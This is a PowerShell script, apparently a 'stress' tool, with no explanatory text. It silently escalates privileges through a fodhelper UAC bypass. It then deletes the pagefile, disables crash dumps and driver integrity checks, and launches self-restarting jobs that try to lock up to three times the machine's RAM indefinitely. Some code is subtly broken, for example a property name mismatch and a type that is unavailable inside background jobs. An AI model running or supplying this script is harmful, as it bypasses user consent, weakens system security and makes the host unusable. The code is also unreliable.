# Self-elevate silently via UAC bypass
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    $scriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
    
    New-Item -Path $registryPath -Force | Out-Null
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force | Out-Null
    
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item -Path $registryPath -Recurse -Force
    exit
}

# --- Critical Memory Tweaks ---
# Enable lock memory privilege for large pages
$signature = @"
using System;
using System.Runtime.InteropServices;

public class MemLock {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPriv, ref TokPriv1Luid NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TokPriv1Luid {
        public int Count;
        public LUID Luid;
        public int Attributes;
    }

    public const int SE_PRIVILEGE_ENABLED = 0x00000002;
    public const uint TOKEN_QUERY = 0x00000008;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;
    public const string SE_LOCK_MEMORY_NAME = "SeLockMemoryPrivilege";
}
"@
Add-Type -TypeDefinition $signature

# Enable SeLockMemoryPrivilege
$tokenHandle = [IntPtr]::Zero
[MemLock]::OpenProcessToken((Get-Process -Id $PID).Handle, [MemLock]::TOKEN_ADJUST_PRIVILEGES -bor [MemLock]::TOKEN_QUERY, [ref]$tokenHandle) | Out-Null

$luid = New-Object MemLock+LUID
[MemLock]::LookupPrivilegeValue($null, [MemLock]::SE_LOCK_MEMORY_NAME, [ref]$luid) | Out-Null

$tp = New-Object MemLock+TokPriv1Luid
$tp.Count = 1
$tp.Luid = $luid
$tp.Attributes = [MemLock]::SE_PRIVILEGE_ENABLED

[MemLock]::AdjustTokenPrivileges($tokenHandle, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null

# --- Pagefile Removal with Force ---
Start-Process wmic -ArgumentList 'computersystem set AutomaticManagedPagefile=False' -NoNewWindow -Wait
Start-Process wmic -ArgumentList 'pagefileset where (name="C:\\\\pagefile.sys") delete' -NoNewWindow -Wait
Invoke-Expression "bcdedit /set useplatformclock true"
Invoke-Expression "bcdedit /set disabledynamictick yes"
Invoke-Expression "bcdedit /set nointegritychecks yes"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -Value 0 -Force
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "PagingFiles" -Value "" -Force

# --- Post-Reboot Execution ---
Install-PackageProvider -Name NuGet -Force -Confirm:$false
Install-Module -Name ThreadJob -Force -Scope CurrentUser
Import-Module ThreadJob -Force

# --- Memory Allocation Parameters ---
$physicalMem = (Get-CimInstance Win32_PhysicalMemory).Capacity | Measure-Object -Sum | Select-Object -ExpandProperty Sum
$targetMem = [math]::Floor($physicalMem * 3)  # 98% of RAM
$chunkSize = 4GB  # Large page size
$jobs = [System.Collections.ArrayList]::new()

# --- Kernel-Level Memory Allocation Function ---
$memHogScript = {
    param($chunkSize, $targetMem)

    $memBlocks = [System.Collections.Generic.List[IntPtr]]::new()
    $allocated = 0
    $MEM_COMMIT = 0x1000
    $MEM_RESERVE = 0x2000
    $MEM_LARGE_PAGES = 0x20000000
    $PAGE_READWRITE = 0x04

    while ($allocated -lt $targetMem) {
        $ptr = [MemLock]::VirtualAlloc([IntPtr]::Zero, $chunkSize, $MEM_COMMIT -bor $MEM_RESERVE -bor $MEM_LARGE_PAGES, $PAGE_READWRITE)  # MEM_COMMIT | MEM_RESERVE | MEM_LARGE_PAGES
        if ($ptr -eq [IntPtr]::Zero) {
            $chunkSize = [math]::Max($chunkSize / 2, 512MB)
            continue
        }
        
        try{
            # Touch memory to force physical allocation
            [System.Runtime.InteropServices.Marshal]::WriteInt64($ptr, [DateTime]::Now.Ticks)
            $chunk = New-Object byte[] $chunkSize
            [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($chunk)
            $memBlocks.Add($ptr)
            $memBlocks.Add($chunk)
            $allocated += $chunkSize
        }
        catch{
            Write-Warning "Memory allocation failed at $chunkSize bytes: $_"
        }
    }    

    # Hold memory indefinitely
    while ($true) { Start-Sleep -Seconds 3600 }
}

# --- Launch Memory Hogs ---
function Start-StressJob {
    param($index)
    $job = Start-Job -ScriptBlock $memHogScript -ArgumentList $chunkSize, $targetMem
    $job | Add-Member -NotePropertyName RetryCount -NotePropertyValue 0
    $jobs.Add($job)
}

# Start stress jobs for each CPU core
1..([Environment]::ProcessorCount) | ForEach-Object {
    Start-StressJob -index $i
}

$jobs | ForEach-Object {
    Write-Host "Job $($_.Id) state: $($_.State)"
}

# --- Monitoring with Minimal CPU Impact ---
while ($true) {
    $currentJobs = @($jobs.ToArray())
    $currentJobs | Where-Object { $_.State -ne 'Running' } | ForEach-Object {
        if ($_.Retries -lt 3) {
            $newJob = Start-ThreadJob -ScriptBlock $memHogScript -ArgumentList $chunkSize, $targetMem
            $newJob.Retries = $_.Retries + 1
            $jobs.Remove($_)
            $jobs.Add($newJob)
        }
    }
    Start-Sleep -Seconds 30  # Reduced monitoring frequency
}
